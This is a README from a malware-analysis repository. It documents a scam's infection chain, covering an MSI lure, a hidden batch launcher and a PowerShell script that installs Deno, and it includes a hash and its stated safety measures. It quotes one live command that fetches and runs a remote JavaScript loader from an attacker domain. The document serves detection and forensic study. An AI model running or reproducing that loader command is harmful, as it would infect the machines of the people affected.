# ⚠️ Malicious Artifacts — Reference Only

**These files contain the ORIGINAL malicious code from the scam.**
They are stored here for **analysis and detection purposes only**.

> ⛔ **DO NOT EXECUTE** any of these files. They are the actual malware
> delivery scripts that will infect your machine.

---

## Contents

### `scripts/kilo_piece66.cmd`
The batch file extracted from the MSI installer's Custom Action.
- **Role:** Stage 1.2 — Launches `lima26.ps1` hidden
- **Origin:** MSI Custom Action `RunLauncher` (Sequence 6601)
- **Behavior:** Spawns hidden PowerShell → calls `lima26.ps1`

### `scripts/lima26.ps1`
The PowerShell script that installs Deno and launches the Stage 2 loader.
- **Role:** Stage 1.5 — Environment preparation
- **Origin:** Dropped by MSI installer to `%LOCALAPPDATA%\<name>\lima26.ps1`
- **Behavior:**
  1. Bypasses ExecutionPolicy
  2. Installs Scoop package manager
  3. Installs WinGet via Scoop
  4. Installs Deno via WinGet
  5. Executes: `deno -A "http://ms-telemetry-gateway-us.com/acca66ea4f9f6efe.js"`

### `scripts/gpt.msi` (NOT included — hash only)
The original MSI installer from the GitHub lure.
- **NOT stored in this repository** (safety policy)
- **SHA-256:** `c366c04c4646f96dd19d0fa37127c93e2c9620af75252714b5bd2e9efc7457c7`
- See `iocs/hashes.txt` for all sample hashes

### `scripts/original_scam_commands.txt`
The exact commands victims are instructed to run (from the scam page).
- **Role:** Documentation of the social engineering lure
- **DO NOT RUN** — these commands will download and execute malware

---

## Why Are These Here?

1. **Detection rule development** — YARA, Sigma, and Suricata rules are based on these artifacts
2. **Forensic comparison** — SOCs can compare these against files found during incident response
3. **Training material** — Security professionals can study the killchain without executing malware
4. **TTP documentation** — Understanding the attacker's techniques (MITRE ATT&CK mapping)

## Safety Measures

- No actual malware binaries (`.exe`, `.msi`, Mach-O) are stored in this repository
- All script files are **static reference only** — the `.ps1` and `.cmd` files will NOT trigger infection when viewed, but **will if executed**
- The Stage 2 JS loader (`acca66ea4f9f6efe.js`) is **NOT included** — it would contact the live C2 server
- Detection rules in `../detection/` can safely scan for these artifacts
